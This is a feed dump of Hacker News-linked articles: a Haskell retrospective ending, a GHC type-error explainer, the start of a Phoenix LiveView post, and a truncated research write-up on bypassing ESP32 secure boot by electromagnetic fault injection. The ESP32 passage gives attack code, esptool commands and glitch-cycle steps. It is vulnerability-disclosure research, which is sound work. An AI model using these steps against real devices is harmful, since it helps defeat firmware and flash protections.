<p>Therefore, I count Julia as a child of Haskell (or maybe, I count Catlab.jl as a child of Haskell) because the idea of organizing computation with category theory would not exist in the same way if it weren’t for Haskell.</p>
<h2 id="conclusion">Conclusion</h2>
<p>If I could talk to the Haskell-obsessed teenager that was me four years ago, I would tell him to keep his mind open. Haskell is still great for a lot of things (compilers come to mind), but if Haskell couldn’t inspire superior successors, there wouldn’t be worthwhile ideas in Haskell. There are those on the internet who are talking about how Haskell is dying, and they may or may not be wrong. Stephen Diehl, one of my main Haskell idols, is distancing himself from the Haskell community because of Haskell’s use as intellectual eye-candy on scam cryptocurrencies, and I think that there may be a tipping point where Haskell loses the zeitgeist of being exciting, and because it never had much of a foothold to begin with in industry, slips into irrelevance. But Haskell will always live on; it had a huge impact on many programmers and many languages disproportionate to its actual use, and it will always have a special place in my heart.</p>





        </div>
      </div></div>]]>
            </description>
            <link>https://owenlynch.org/posts/2020-09-16-haskells-children/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552512</guid>
            <pubDate>Tue, 22 Sep 2020 09:21:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bypassing ESP32 Encrypted Secure Boot]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24552482">thread link</a>) | @mleonhard
<br/>
September 22, 2020 | https://raelize.com/posts/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/ | <a href="https://web.archive.org/web/*/https://raelize.com/posts/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>We arrived at the last post about our <strong>Fault Injection</strong> research on the <strong>ESP32</strong>. Please read our previous posts as it provides context to the results described in this post.</p>
<ul>
<li><a href="https://raelize.com/posts/espressif-systems-esp32-bypassing-sb-using-emfi/">Espressif ESP32: Bypassing Secure Boot using EMFI</a></li>
<li><a href="https://raelize.com/posts/espressif-systems-esp32-controlling-pc-during-sb/">Espressif ESP32: Controlling PC during Secure Boot</a></li>
<li><a href="https://raelize.com/posts/espressif-systems-esp32-bypassing-flash-encryption/">Espressif ESP32: Bypassing Flash Encryption (CVE-2020-15048)</a></li>
</ul>
<p>During our <strong>Fault Injection</strong> research on the <strong>ESP32</strong>, we gradually took steps forward in order to identify the required vulnerabilities that allowed us to bypass <strong>Secure Boot</strong> and <strong>Flash Encryption</strong> with a single <strong>EM</strong> glitch. Moreover, we did not only achieve <strong>code execution</strong>, we also extracted the <strong>plain-text flash</strong> data from the chip.</p>
<p><strong>Espressif</strong> requested a <strong>CVE</strong>  for the attack described in this post: <a href="https://www.espressif.com/sites/default/files/advisory_downloads/Security%20Advisory%20CVE-2020-15048%2C%2013629%20EN%26CN.pdf" target="_blank">CVE-2020-13629</a>. Please note, that the attack as described in this post, is only applicable to <strong>ESP32</strong> silicon revision 0 and 1. The newer <strong>ESP32 V3</strong> silicon supports functionality to disable the <strong>UART bootloader</strong> that we leveraged for the attack.</p>

<p>The <strong>ESP32</strong> implements an <strong>UART bootloader</strong> in its <strong>ROM code</strong>. This feature allows, among other functionality, to program the external flash. It's not uncommon that such functionality is implemented in the <strong>ROM code</strong> as it's quite robust as the code cannot get corrupt easily. If this functionality would be implemented by code stored in the external flash, any corruption of the flash may result in a bricked device.</p>
<p>Typically, this type of functionality is accessed by booting the chip in a special <strong>boot mode</strong>. The <strong>boot mode</strong> selection is often done using one or more external strap pin(s) which are set before resetting the chip. On the <strong>ESP32</strong> it works exactly like this pin <code>G0</code> which is exposed externally.</p>
<p>The <strong>UART bootloader</strong> supports many interesting <a href="https://github.com/espressif/esptool/wiki/Serial-Protocol#command-opcodes" target="_blank">commands</a> that can be used to read/write memory, read/write registers and even execute a stub from <strong>SRAM</strong>.</p>
<h4 id="executing-arbitrary-code">Executing arbitrary code</h4>
<p>The <strong>UART bootloader</strong> supports loading and executing arbitrary code using the <code>load_ram</code> command. The <strong>ESP32</strong>'s SDK includes all the tooling required to compile the code that can be executed from <strong>SRAM</strong>. For example, the following code snippet will print <code>SRAM CODE\n</code> on the serial interface.</p>
<div><pre><code data-lang="C"><span>void</span> <span>__attribute__</span><span>((</span><span>noreturn</span><span>))</span> <span>call_start_cpu0</span><span>()</span>
<span>{</span>
    <span>ets_printf</span><span>(</span><span>"SRAM CODE</span><span>\n</span><span>"</span><span>);</span>
    <span>while</span> <span>(</span><span>1</span><span>);</span>
<span>}</span>
</code></pre></div><p>The <code>esptool.py</code> tool, which is part of the <strong>ESP32</strong>'s SDK, can be used to load the compiled binary into the <strong>SRAM</strong> after which it will be executed.</p>
<pre><code>esptool.py --chip esp32 --no-stub --port COM3 load_ram code.bin
</code></pre><p>Interestingly, the <strong>UART bootloader</strong> cannot disabled and therefore always accessible, even when <strong>Secure Boot</strong> and <strong>Flash Encryption</strong> are enabled.</p>
<h4 id="additional-measures">Additional measures</h4>
<p>Obviously, if no additional security measures would be taken, leaving the <strong>UART bootloader</strong> always accessible would render <strong>Secure Boot</strong> and <strong>Flash Encryption</strong> likely useless. Therefore, <strong>Espressif</strong> implemented additional security measures which are enabled using dedicated <strong>eFuses</strong>.</p>
<p>These are security configuration bits implemented in special memory, often referred to as <strong>OTP memory</strong>, which can typically only change from 0 to 1. This guarantees, that once enabled, is enabled forever. The following <strong>OTP memory</strong> bits are used to disable specific functionality when the <strong>ESP32</strong> is in the <strong>UART bootloader</strong> boot mode.</p>
<ul>
<li><strong>DISABLE_DL_ENCRYPT</strong>: disables flash encryption operation</li>
<li><strong>DISABLE_DL_DECRYPT</strong>: disables transparent flash decryption</li>
<li><strong>DISABLE_DL_CACHE</strong>: disables the entire MMU flash cache</li>
</ul>
<p>The most relevant <strong>OTP memory</strong> bit is <strong>DISABLE_DL_DECRYPT</strong> as it disables the transparent decryption of the flash data.</p>
<p>If not set, it would be possible to simply access the plain-text flash data while the <strong>ESP32</strong> is in its <strong>UART bootloader</strong> boot mode.</p>
<p>If set, any access to the flash, when the chip is in <strong>UART bootloader</strong> boot mode, will yield just the encrypted data. The <strong>Flash Encryption</strong> feature, which is fully implemented in hardware and transparent to the processor,  is only enabled in when the <strong>ESP32</strong> is in <strong>Normal</strong> boot mode.</p>
<p>The attacks described in this post have all these bits set to 1.</p>

<p>The <strong>SRAM</strong> memory that's used by the <strong>ESP32</strong> is typical technology that's used by many chips. It's commonly used to the <strong>ROM</strong>'s stack and executing the first bootloader from flash. It's convenient to use at early boot as it typically require no configuration before it can be used.</p>
<p>We know from previous experience that the data stored in <strong>SRAM</strong> memory is persistent until it's overwritten or the required power is removed from the physical cells. After a <strong>cold reset</strong> (i.e. power-cycle) of the chip, the <strong>SRAM</strong> will be reset to its default state. This often semi-random and unique per chip as the default value for each bit (i.e. 0 or 1) is different.</p>
<p>However, after a <strong>warm reset</strong>, where the entire chip is reset without removing the power, it may happen that the data stored in <strong>SRAM</strong> remains unaffected. This persistence of the data is visualized in the picture below.</p>
<p>
    <a href="https://raelize.com/img/esp32/esp32-sram-persistence.png">
        <img src="https://raelize.com/img/esp32/esp32-sram-persistence.png" width="700px">
    </a>
</p>
<p>We decided to figure out if this behavior holds up for the <strong>ESP32</strong> as well. We identified that the hardware <a href="https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/system/wdts.html" target="_blank">watchdog</a> can be used to issue a <strong>warm reset</strong> from software. This <strong>watchdog</strong> can also be issued when the chip is in <strong>UART bootloader</strong> boot mode and therefore we can use it to reset the <strong>ESP32</strong> back into <strong>Normal</strong> boot mode.</p>
<p>Using some test code, loaded and executed in <strong>SRAM</strong> using the <strong>UART bootloader</strong>, we determined that the data in <strong>SRAM</strong> is indeed persistent after issuing a <strong>warm reset</strong> using the <strong>watchdog</strong>. Effectively this means we can boot the <strong>ESP32</strong> in <strong>Normal</strong> boot mode with the <strong>SRAM</strong> filled with controlled data.</p>
<p>But… how can we (ab)use this?</p>

<p>We envisioned that we may be able to leverage the persistence of data in <strong>SRAM</strong> across <strong>warm resets</strong> for an attack. The first attack we came up with is to fill the <strong>SRAM</strong> with code using the <strong>UART bootloader</strong> and issue a <strong>warm reset</strong> using the <strong>watchdog</strong>. Then, we inject a glitch while the <strong>ROM code</strong> is overwriting this code with the <strong>flash bootloader</strong> during a normal boot.</p>
<p>We got this ideas as during our previous experiments, where we <a href="">turned data transfers into code execution</a>, we noticed that for some experiments the chip started executing from the entry address before the bootloader was finished copying.</p>
<p>Sometimes you just need to try it…</p>
<h4 id="attack-code">Attack code</h4>
<p>The code that we load into the <strong>SRAM</strong> using the <strong>UART bootloader</strong> is shown below.</p>
<div><pre><code data-lang="C"><span>#define a "addi a6, a6, 1;"
</span><span>#define t a a a a a a a a a a
</span><span>#define h t t t t t t t t t t
</span><span>#define d h h h h h h h h h h
</span><span></span>
<span>void</span> <span>__attribute__</span><span>((</span><span>noreturn</span><span>))</span> <span>call_start_cpu0</span><span>()</span> <span>{</span>
    <span>uint8_t</span> <span>cmd</span><span>;</span>

    <span>ets_printf</span><span>(</span><span>"SRAM CODE</span><span>\n</span><span>"</span><span>);</span>

    <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>

        <span>cmd</span> <span>=</span> <span>0</span><span>;</span>
        <span>uart_rx_one_char</span><span>(</span><span>&amp;</span><span>cmd</span><span>);</span>

        <span>if</span><span>(</span><span>cmd</span> <span>==</span> <span>'A'</span><span>)</span> <span>{</span>                                    <span>// 1
</span><span></span>            <span>*</span><span>(</span><span>unsigned</span> <span>int</span> <span>*</span><span>)(</span><span>0x3ff4808c</span><span>)</span> <span>=</span> <span>0x4001f880</span><span>;</span>
            <span>*</span><span>(</span><span>unsigned</span> <span>int</span> <span>*</span><span>)(</span><span>0x3ff48090</span><span>)</span> <span>=</span> <span>0x00003a98</span><span>;</span>
            <span>*</span><span>(</span><span>unsigned</span> <span>int</span> <span>*</span><span>)(</span><span>0x3ff4808c</span><span>)</span> <span>=</span> <span>0xc001f880</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>asm</span> <span>volatile</span> <span>(</span> <span>d</span> <span>);</span>                                     <span>// 2
</span><span></span>
    <span>"movi a6, 0x40; slli a6, a6, 24;"</span>                       <span>// 3
</span><span></span>    <span>"movi a7, 0x00; slli a7, a7, 16;"</span>
    <span>"xor a6, a6, a7;"</span>
    <span>"movi a7, 0x7c; slli a7, a7, 8;"</span>
    <span>"xor a6, a6, a7;"</span>
    <span>"movi a7, 0xf8;"</span>
    <span>"xor a6, a6, a7;"</span>

    <span>"movi a10, 0x52; callx8  a6;"</span> <span>// R
</span><span></span>    <span>"movi a10, 0x61; callx8  a6;"</span> <span>// a            
</span><span></span>    <span>"movi a10, 0x65; callx8  a6;"</span> <span>// e               
</span><span></span>    <span>"movi a10, 0x6C; callx8  a6;"</span> <span>// l               
</span><span></span>    <span>"movi a10, 0x69; callx8  a6;"</span> <span>// i               
</span><span></span>    <span>"movi a10, 0x7A; callx8  a6;"</span> <span>// z               
</span><span></span>    <span>"movi a10, 0x65; callx8  a6;"</span> <span>// e               
</span><span></span>    <span>"movi a10, 0x21; callx8  a6;"</span> <span>// !               
</span><span></span>    <span>"movi a10, 0x0a; callx8  a6;"</span> <span>// \n               
</span><span></span>
    <span>while</span><span>(</span><span>1</span><span>);</span>
<span>}</span>
</code></pre></div><p>To summarize, the above code implements the following:</p>
<ol>
<li>Command handler with a single command to perform a <strong>watchdog</strong> reset</li>
<li>NOP-like padding using <code>addi</code> instructions</li>
<li>Assembly for printing <code>Raelize!</code> on the serial interface</li>
</ol>
<p>Please note, the listing's numbers match the numbers in the code.</p>
<h4 id="timing">Timing</h4>
<p>We target a reasonably small attack window at the start of <strong>F</strong> which is shown in the picture below. We know from previous experiments that during this moment the <strong>flash bootloader</strong> is copied.</p>
<p>
    <a href="https://raelize.com/img/esp32/esp32-spi-pin1-during-boot.png">
        <img src="https://raelize.com/img/esp32/esp32-spi-pin1-during-boot.png" width="600px">
    </a>
</p>
<p>The glitch must be injected before our code in <strong>SRAM</strong> is entirely overwritten by the valid <strong>flash bootloader</strong>.</p>
<h4 id="attack-cycle">Attack cycle</h4>
<p>We took the following steps for each experiment to determine if the attack idea actually works. A successful glitch will print <code>Raelize!</code> on the serial interface.</p>
<ol>
<li>Set pin <strong>G0</strong> to low and perform a <strong>cold reset</strong> to enter <strong>UART bootloader</strong> boot mode</li>
<li>Use the <code>load_ram</code> command to execute our <strong>attack code</strong> from <strong>SRAM</strong></li>
<li>Send an <code>A</code> to the program to issue a <strong>warm reset</strong> into <strong>normal</strong> boot mode</li>
<li>Inject a glitch while the <strong>flash bootloader</strong> is being copied by the <strong>ROM code</strong></li>
</ol>
<h4 id="results">Results</h4>
<p>After running these experiments for more than a day, resulting in more than 1 million experiments, we did not observe any successful glitch…</p>
<h4 id="an-unexpected-result">An unexpected result</h4>
<p>Nonetheless, while analyzing the results, we noticed something unexpected.</p>
<p>The <strong>serial interface</strong> output for one of the experiments, which is shown below, indicated that the glitch caused an <strong>illegal instruction</strong> exception.</p>
<pre><code>ets Jun  8 2016 00:22:57
rst:0x10 (RTCWDT_RTC_RESET),boot:0x13 (SPI_FAST_FLASH_BOOT)
configsip: 0, SPIWP:0xee
clk_drv:0x00,q_drv:0x00,d_drv:0x00,cs0_drv:0x00,hd_drv:0x00,wp_drv:0x00
mode:DIO, clock div:2
load:0x3fff0008,len:4
load:0x3fff000c,len:3220
load:0x40078000,len:4816
load:0x40080400,len:18640
entry 0x40080740
Fatal exception (0): IllegalInstruction
epc1=0x661b661b, epc2=0x00000000, epc3=0x00000000, 
excvaddr=0x00000000, depc=0x00000000
</code></pre><p>These type of exceptions happened quite often when glitches are injected in a chip. This was not different for the <strong>ESP32</strong>. For most the exceptions the <code>PC</code> register is set to a value that's expected (i.e. a valid address). It does not happen often the <code>PC</code> register is set to such an interesting value.</p>
<p>The <code>Illegal Instruction</code> exception is caused as there is no valid instruction stored at the <code>0x661b661b</code> address. We conclude this value must come from somewhere and that is cannot magically end up in the <code>PC</code> register.</p>
<p>We analyzed the code that we load into the <strong>SRAM</strong> in order to find an explanation. The …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raelize.com/posts/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/">https://raelize.com/posts/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/</a></em></p>]]>
            </description>
            <link>https://raelize.com/posts/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552482</guid>
            <pubDate>Tue, 22 Sep 2020 09:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Un-obscuring a few GHC type error messages]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552384">thread link</a>) | @todsacerdoti
<br/>
September 22, 2020 | https://free.cofree.io/2020/09/01/type-errors/ | <a href="https://web.archive.org/web/*/https://free.cofree.io/2020/09/01/type-errors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">

      
      

      
        <p>Generally speaking, GHC’s error messages are fairly helpful and intelligible (so long as you don’t go wild with type-level
programming). But there are definitely a few common but relatively less clear ones. Some of the GHC type error messages
that can potentially lead to bewilderment are discussed in this post. The GHC version I used is 8.10.2.</p>



<p>If you’ve written Haskell for any amount of time, you’ve probably seen this error message, and it is hardly a confusing one.
However, the word “rigid” may seem counter-intuitive, and one might wonder what it actually means.
Consider the following function definition:</p>



<p>This definition does not compile and the error message is</p>

<div><div><pre><code>• Couldn't match expected type ‘Bool’ with actual type ‘a’
  ‘a’ is a rigid type variable bound by
    the type signature for:
      f :: forall a. a -&gt; a
    at Example.hs:11:1-11
• In the first argument of ‘not’, namely ‘x’
  In the expression: not x
  In an equation for ‘f’: f x = not x
• Relevant bindings include
    x :: a (bound at Example.hs:12:3)
    f :: a -&gt; a (bound at Example.hs:12:1)
</code></pre></div></div>

<p>It should be obvious why <code>f</code> doesn’t type check, but a potential point of confusion for some, including myself when I first
encountered an error message like this is: why does it say <code>a</code> is “rigid”? <code>a</code> can represent any type, so shouldn’t it be “flexible”?</p>

<p><code>a</code> is flexible indeed, but only from the perspective of the caller of <code>f</code>. From the perspective of the definition of <code>f</code>, it is not
at all flexible. The definition of <code>f</code> must treat <code>a</code> as some unknown but fixed type, and must do the exact same thing
for all possible <code>a</code>.</p>

<p>Haskell has several sorts of type variables, including:</p>

<ul>
  <li>Type variables written by programmers, such as those bound by <code>forall</code>s in type signatures, and those appearing in type
applications and type annotations.</li>
  <li>Type variables used internally by the compiler. These include
    <ul>
      <li><em>Unification type variables</em> (or flexible type variables, meta type variables, unification variables). They are fresh variables allocated
to stand for unknown types that need to be determined. One of the tasks of the type inference engine is to determine their actual types by
finding a substitution for each unification variable. Unification variables are flexible in the sense that
they can unify with any type or type variable that does not contain <code>forall</code>s<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> (except when they are untouchable, which will be explained later).</li>
      <li><em>Rigid type variables</em> (or skolem type variables, skolem constants, skolems). They are fresh variables allocated to stand for unknown but fixed
types. Their actual types do not need to be, and cannot be determined. They are rigid in the sense that they cannot unify with
anything other than themselves or unification variables. In particular, a rigid type variable cannot unify with a concrete
type or type constructor, or another rigid type variable.</li>
    </ul>
  </li>
</ul>

<p>Unification type variables and rigid type variables are freshly allocated by the type checker. In an error message like</p>

<div><div><pre><code>Couldn't match expected type &lt;expected&gt; with actual type &lt;actual&gt;
</code></pre></div></div>

<p><code>&lt;expected&gt;</code> and <code>&lt;actual&gt;</code> often contain type variables not written by the programmer, because they are compiler-allocated.</p>

<p>When type checking the above <code>f</code> function, where <code>a</code> is a programmer-written, universally quantified type variable, GHC first allocates
a rigid type variable for it (a process called skolemization), because from <code>f</code>’s point of view, <code>a</code> is unknown and fixed (or existential). The body
of <code>f</code> requests that this rigid type variable be unified with <code>Bool</code>, which the type checker outright refuses, hence the above error message.</p>



<p>A rigid/skolem type variable cannot escape, via a unification variable, the scope where it is introduced. In other words, a
rigid type variable can unify with a unification variable, but not when that unification variable has a bigger scope.
This can happen in two cases.</p>

<p><strong>1. Type checking a polymorphic function argument:</strong></p>

<div><div><pre><code><span>fun</span> <span>::</span> <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>[</span><span>a</span><span>]</span> <span>-&gt;</span> <span>b</span><span>)</span> <span>-&gt;</span> <span>Bool</span>
<span>fun</span> <span>_</span> <span>=</span> <span>True</span>

<span>arg</span> <span>::</span> <span>c</span> <span>-&gt;</span> <span>c</span>
<span>arg</span> <span>c</span> <span>=</span> <span>c</span>

<span>x</span> <span>::</span> <span>Bool</span>
<span>x</span> <span>=</span> <span>fun</span> <span>arg</span>
</code></pre></div></div>

<p>This leads to the following error:</p>

<div><div><pre><code>• Couldn't match type ‘b0’ with ‘[a]’
    because type variable ‘a’ would escape its scope
  This (rigid, skolem) type variable is bound by
    a type expected by the context:
      forall a. [a] -&gt; b0
    at Example.hs:18:9-11
  Expected type: [a] -&gt; b0
    Actual type: b0 -&gt; b0
• In the first argument of ‘fun’, namely ‘arg’
  In the expression: fun arg
  In an equation for ‘x’: x = fun arg
</code></pre></div></div>

<p>In order for <code>x = fun arg</code> to be well typed, <code>arg</code>’s type must subsume (i.e., be more general than or equal
to) the type required by <code>fun</code>. This is <em>not</em> the case here. <code>fun</code> requires that its argument be able to convert a list of <code>a</code>s for any
arbitrary <code>a</code>, into a <em>fixed</em> <code>b</code>. <code>b</code> can be flexibly chosen, for instance <code>fun (length :: [a] -&gt; Int)</code> would be legal, but it is
chosen before <code>a</code>, and must be fixed (i.e., does not depend on <code>a</code>) once chosen. <code>arg</code> does not satisfy this requirement, because it maps an
arbitrary <code>a</code> to itself. Therefore, this program is rejected.</p>

<p>When type checking <code>x = fun arg</code>, the type checker allocates a rigid type variable for <code>a</code>, and allocates unification
variables for <code>b</code> and <code>c</code>. It then determines that the type of both <code>b</code> and <code>c</code> is <code>[a]</code>. But sadly, <code>b</code> is not allowed to
unify with <code>[a]</code>, because <code>b</code> is bound by an (implicit) top-level <code>forall</code>, while <code>a</code> is bound by an inner <code>forall</code>. If they were
allowed to unify, the rigid/skolem type variable <code>a</code> would escape its scope via unification variable <code>b</code>.</p>

<p>By the way, this is how the ST monad works.</p>

<p><strong>2. Opening existential types:</strong></p>

<div><div><pre><code><span>data</span> <span>A</span> <span>=</span> <span>forall</span> <span>a</span><span>.</span> <span>A</span> <span>a</span>
<span>f</span> <span>(</span><span>A</span> <span>x</span><span>)</span> <span>=</span> <span>Just</span> <span>x</span>
</code></pre></div></div>

<p>This leads to a similar skolem escape error:</p>

<div><div><pre><code>• Couldn't match expected type ‘p’ with actual type ‘Maybe a’
    because type variable ‘a’ would escape its scope
  This (rigid, skolem) type variable is bound by
    a pattern with constructor: A :: forall a. a -&gt; A,
    in an equation for ‘f’
    at Example.hs:12:4-6
• In the expression: Just x
  In an equation for ‘f’: f (A x) = Just x
• Relevant bindings include
    x :: a (bound at Example.hs:12:6)
    f :: A -&gt; p (bound at Example.hs:12:1)
</code></pre></div></div>

<p>The type of the value encapsulated in an existential type (<code>x</code> in this example) is considered private.
When an existential type is opened via pattern matching<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, a rigid type variable is allocated to denote the (unknown but fixed)
private type, i.e., <code>x</code>’s type, and a unification variable (<code>p</code> in this example) is allocated to denote the type of
the pattern matching branch. This rigid type variable must not escape the scope of the branch via the unification variable.</p>

<p>In other words, Let <code>a</code> denote <code>x</code>’s type in <code>case A of (A x) -&gt; ...</code>. The types of local bindings within <code>...</code> (declared
in <code>let</code> or <code>where</code> clauses) may refer to <code>a</code> (but you can’t write explicit type signatures for such bindings), but the type of
the entire <code>...</code> may not. Therefore the above <code>f</code> is ill-typed because the right hand side has type <code>Maybe a</code> which of course
mentions <code>a</code>.</p>

<p>If Haskell allowed the <code>exists</code> keyword for existential quantification, <code>f</code> would be well-typed because it would be possible
to assign the following type to <code>f</code>:</p>

<div><div><pre><code><span>f</span> <span>::</span> <span>A</span> <span>-&gt;</span> <span>exists</span> <span>a</span><span>.</span> <span>Maybe</span> <span>a</span>
</code></pre></div></div>

<p>But Haskell doesn’t have the <code>exists</code> keyword, because <code>exists</code> can be expressed in terms of <code>forall</code> and <code>-&gt;</code>:</p>

<div><div><pre><code><span>exists</span> <span>a</span><span>.</span> <span>Maybe</span> <span>a</span>  <span>≅</span>  <span>forall</span> <span>r</span><span>.</span> <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>Maybe</span> <span>a</span> <span>-&gt;</span> <span>r</span><span>)</span> <span>-&gt;</span> <span>r</span>
</code></pre></div></div>

<p>Intuitively, saying “I have a <code>Maybe a</code> for some <code>a</code>, but I won’t tell you what <code>a</code> is” is equivalent to saying “If you give me
a function that maps an arbitrary <code>Maybe a</code> to <code>r</code>, then I’ll give you an <code>r</code> back, by applying your function to my secret <code>Maybe a</code>”.</p>

<p>But note that the LHS and RHS above are only isomorphic; they are not identical. So <code>f</code> in the above example
doesn’t have a valid haskell type, but the following function <code>g</code>, which is isomorphic to <code>f</code>, does have a valid type:</p>

<div><div><pre><code><span>g</span> <span>::</span> <span>A</span> <span>-&gt;</span> <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>Maybe</span> <span>a</span> <span>-&gt;</span> <span>r</span><span>)</span> <span>-&gt;</span> <span>r</span>
<span>g</span> <span>(</span><span>A</span> <span>x</span><span>)</span> <span>h</span> <span>=</span> <span>h</span> <span>(</span><span>Just</span> <span>x</span><span>)</span>
</code></pre></div></div>

<p>Incidentally, in intuitionistic second-order propositional logic<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>, not only the existential quantifier, but also
negation, conjunction, disjunction and absurdity, can all be expressed in terms of the universal quantifier and <code>-&gt;</code>. For example,
absurdity (corresponding to Haskell’s <code>Void</code> type) is <code>forall a. a</code>, and <code>a \/ b</code> (corresponding to Haskell’s sum type)
is <code>forall r. (a -&gt; r) -&gt; (b -&gt; r) -&gt; r</code>. But this is off topic so I digress.</p>



<p>The “untouchable” error can happen when you pattern match against a GADT without supplying a
type signature. Consider this example:</p>

<div><div><pre><code><span>data</span> <span>A</span> <span>a</span> <span>where</span>
  <span>A</span> <span>::</span> <span>A</span> <span>Bool</span>

<span>f</span> <span>=</span> <span>\</span><span>case</span> <span>A</span> <span>-&gt;</span> <span>True</span>
</code></pre></div></div>

<p>This seemingly trivial and unproblematic code does not type check:</p>

<div><div><pre><code>• Couldn't match expected type ‘p’ with actual type ‘Bool’
    ‘p’ is untouchable
      inside the constraints: a ~ Bool
      bound by a pattern with constructor: A :: A Bool,
                in a case alternative
      at Example.hs:15:11
  ‘p’ is a rigid type variable bound by
    the inferred type of f :: A a -&gt; p
    at Example.hs:15:1-19
  Possible fix: add a type signature for ‘f’
• In the expression: True
  In a case alternative: A -&gt; True
  In the expression: \case A -&gt; True
• Relevant bindings include
    f :: A a -&gt; p (bound at Example.hs:15:1)
</code></pre></div></div>

<p>This is because <code>f</code> has more than one valid type:</p>

<div><div><pre><code><span>f</span> <span>::</span> <span>forall</span> <span>a</span><span>.</span> <span>A</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>f</span> <span>::</span> <span>forall</span> <span>a</span><span>.</span> <span>A</span> <span>a</span> <span>-&gt;</span> <span>Bool</span>
</code></pre></div></div>

<p>Note that neither of the above two types is more general than the other. They are just two different and incomparable types. In other words,
<code>f</code> lacks a <em>principal type</em> (a unique most general type)<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. The fix is to add a type signature for <code>f</code>, which is clearly indicated in the error message.</p>

<p>The word “untouchable” refers to the fact that the return type of the pattern matching, although a unification
variable, is considered unavailable for unification in this particular branch. Therefore it can’t actually be unified with <code>Bool</code>.</p>

<p>If data type <code>A</code> had other data constructors, and the pattern match in <code>f</code> had more branches, then another branch may end up successfully
unifying the result of the pattern match with Bool. For instance if <code>A</code> and <code>f</code> are defined as</p>

<div><div><pre><code><span>data</span> <span>A</span> <span>a</span> <span>where</span>
  <span>A</span> <span>::</span> <span>A</span> <span>Bool</span>
  <span>B</span> <span>::</span> <span>A</span> <span>a</span>

<span>f</span> <span>=</span> <span>\</span><span>case</span> <span>A</span> <span>-&gt;</span> <span>True</span><span>;</span> <span>B</span> <span>-&gt;</span> <span>True</span>
</code></pre></div></div>

<p>then…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://free.cofree.io/2020/09/01/type-errors/">https://free.cofree.io/2020/09/01/type-errors/</a></em></p>]]>
            </description>
            <link>https://free.cofree.io/2020/09/01/type-errors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552384</guid>
            <pubDate>Tue, 22 Sep 2020 08:59:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Beauty of (Phoenix) LiveView]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552363">thread link</a>) | @thibaut_barrere
<br/>
September 22, 2020 | https://dashbit.co/blog/the-beauty-of-liveview | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/the-beauty-of-liveview">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> September 22nd, 2020
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/liveview">liveview</a>
  </li>
</ul>
<p>
Lately we have been working on <a href="https://bytepack.io/">Bytepack</a> to help developers deliver and sell packages to companies and enterprises.</p>
<p>
In Bytepack, authors can push new packages at any time. Publishing said packages is done with your usual package manager tool, such as <code>mix hex.publish</code> in Elixir or <code>npm publish</code> for Node.js. Once you call these commands, the request goes to specific endpoints that implement the Hex.pm and npm APIs.</p>
<p>
The specific steps are shown in our “New package” page:</p>
<p>
    <img src="https://dashbit.co/images/posts/2020/bytepack-new-package.png" alt="ytepack new package screen"><br></p>
<p>
The <code>/packages/new</code> route is a <a href="https://phoenixframework.org/">Phoenix LiveView</a> that looks like this:</p>
<pre><code><span>defmodule</span><span> </span><span>BytepackWeb.PackageLive.New</span><span> </span><span data-group-id="8580950847-1">do</span><span>
  </span><span>use</span><span> </span><span>BytepackWeb</span><span>,</span><span> </span><span>:live_view</span><span>

  </span><span>def</span><span> </span><span>mount</span><span data-group-id="8580950847-2">(</span><span>params</span><span>,</span><span> </span><span>session</span><span>,</span><span> </span><span>socket</span><span data-group-id="8580950847-2">)</span><span> </span><span data-group-id="8580950847-3">do</span><span>
    </span><span>socket</span><span> </span><span>=</span><span> </span><span>authenticate</span><span data-group-id="8580950847-4">(</span><span>socket</span><span>,</span><span> </span><span>session</span><span data-group-id="8580950847-4">)</span><span>
    </span><span data-group-id="8580950847-5">{</span><span>:noreply</span><span>,</span><span> </span><span>socket</span><span data-group-id="8580950847-5">}</span><span>
  </span><span data-group-id="8580950847-3">end</span><span>

  </span><span>def</span><span> </span><span>render</span><span data-group-id="8580950847-6">(</span><span>assigns</span><span data-group-id="8580950847-6">)</span><span> </span><span data-group-id="8580950847-7">do</span><span>
    </span><span>~L"""
    ...HTML template...
    """</span><span>
  </span><span data-group-id="8580950847-7">end</span><span>
</span><span data-group-id="8580950847-1">end</span></code></pre>
<p>
Nothing special so far. But here is where LiveView is a big deal.</p>
<p>
To improve the user experience, we also wanted to automatically update the browser with the package information whenever the user publishes it. Implementing this functionality in LiveView requires three changes.</p>
<p>
First we broadcast an event whenever a package is created to a “package:new” topic under the user:</p>
